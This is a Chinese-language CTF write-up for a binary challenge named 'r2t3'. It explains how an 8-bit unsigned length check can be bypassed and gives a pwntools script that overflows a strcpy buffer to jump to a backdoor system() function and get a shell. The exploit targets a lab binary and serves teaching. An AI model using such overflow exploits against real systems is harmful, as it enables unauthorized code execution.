首先检查安全机制

![image-20201101105215030](https://static.hack1s.fun/images/2021/02/06/image-20201101105215030.png)

开启了NX；

运行一下，发现是一个需要输入用户名



查找对system函数的调用，可以发现存在一个后门函数dl_registery

![image-20201101105611971](https://static.hack1s.fun/images/2021/02/06/image-20201101105611971.png)

main函数中对输入的name做了一个检查

![image-20201101105649086](https://static.hack1s.fun/images/2021/02/06/image-20201101105649086.png)

这里的name_check应该是一个长度检查的函数

![image-20201101105733721](https://static.hack1s.fun/images/2021/02/06/image-20201101105733721.png)

按说输入的name长度在4-8之间就可以通过，但是试了之后发现并不可以；

主要原因在于这个检查是和unsigned int比较的；

所以实际上这里输入的数字很大时可以绕过，因为v3是一个unsigned int8，所以最大255

这里要求4-8，所以可以用长度在255+4-255+8之间绕过，这样最低的8位是满足要求的



最后看返回的地方，是将可控的缓冲区s用strcpy复制到了dest这个地方；

这里距离堆栈还有0x11的距离，之后加上ebp的4个字节，一共需要填充0x15字节

```python
from pwn import *

io = process('./r2t3')

io.recvuntil('name:\n')

payload = 'a'*0x11 + 'b'*4
payload = payload + p32(0x0804858b)
payload = payload + (255+5-len(payload))*'c'

io.sendline(payload)
io.interactive()
```

